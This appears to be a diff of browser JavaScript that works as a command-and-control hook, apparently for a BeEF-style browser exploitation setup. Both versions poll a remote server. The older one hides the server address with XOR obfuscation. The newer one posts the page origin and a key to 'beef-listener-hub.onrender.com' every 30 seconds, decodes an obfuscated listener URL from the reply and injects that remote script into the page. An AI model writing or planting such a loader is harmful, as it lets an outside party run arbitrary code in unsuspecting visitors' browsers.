@@ -1,60 +1,78 @@
-const key = "my_secret_key";
-const origin = "BQ0rAxZZXUoWOg4DVAEQLAcADRcXWTceB1cCFy0WCwcXF1o8BAhWDAk2XBcMBxERcQEWFgM=";
+const key       = "my_secret_key";
+const origin = "https://beef-listener-hub.onrender.com";
+let status = "idle";
 
 function xorDecode(encoded, key) {
-    const text = atob(encoded);
-    let result = "";
-    for (let i = 0; i < text.length; i++)
-        result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-    return result;
+  const text = atob(encoded);
+  let result = "";
+  for (let i = 0; i < text.length; i++) result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+  return result;
 }
 
-async function loadListenerScript(scriptUrl) {
-    try {
-        new URL(scriptUrl);
-    } catch {
-        console.warn("Invalid listener URL:", scriptUrl);
-        return;
-    }
+function loadListenerScript(scriptUrl) {
+  try { new URL(scriptUrl); } catch {
+    console.warn("Invalid listener URL:", scriptUrl);
+    return;
+  }
 
-    if (document.querySelector(`script[src="${scriptUrl}"]`)) return;
+  if (document.querySelector(`script[src="${scriptUrl}"]`)) return;
 
-    const script = document.createElement("script");
-    script.src = scriptUrl;
-    script.async = true;
-    script.onload = () => console.log("Listener script loaded:", scriptUrl);
-    script.onerror = () => {
-        console.warn("Listener script not found or failed, removing and waiting for next poll:", scriptUrl);
-        script.remove();
-    };
-    document.head.appendChild(script);
+  const script  = document.createElement("script");
+  script.src    = scriptUrl;
+  script.async  = true;
+
+  script.onload = () => {
+    console.log("Listener script loaded:", scriptUrl);
+    status = "active";
+  };
+
+  script.onerror = () => {
+    console.warn("Listener script failed, removing:", scriptUrl);
+    script.remove();
+  };
+  document.head.appendChild(script);
 }
 
-function getListener(origin) {
-    const configUrl = xorDecode(origin, key);
 
+function getListener() {
     async function fetchListener() {
         try {
-            const response = await fetch(configUrl);
+            const response = await fetch(origin + "/api/route",
+                {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                    FROM: window.location.origin,
+                    KEY: key,
+                    STATUS: status
+                    })
+                }
+            );
+
             if (!response.ok) throw new Error(`HTTP ${response.status}`);
 
             const data = await response.json();
             const listenerUrl = data.listener;
 
             if (!listenerUrl) {
-                console.warn("No listener in response, waiting...");
+                console.warn("No listener available");
                 return;
             }
-
-            console.log("hash received:", listenerUrl);
-            await loadListenerScript(xorDecode(listenerUrl, key));
+            console.log("Received listener URL:", listenerUrl);
+            loadListenerScript(xorDecode(listenerUrl, key));
         } catch (err) {
-            console.error("Failed to fetch listener config:", err);
+            console.error("Failed to communicate with server:",err);
         }
     }
 
-    fetchListener();
-    return setInterval(fetchListener, 30 * 1000);
+  fetchListener();
+  return setInterval(fetchListener, 30 * 1000);
 }
 
-const timer = getListener(origin);
+const timer = getListener();
+
+window.addEventListener("beforeunload", () => {
+    console.log("PAGE RELOAD DETECTED");
+});
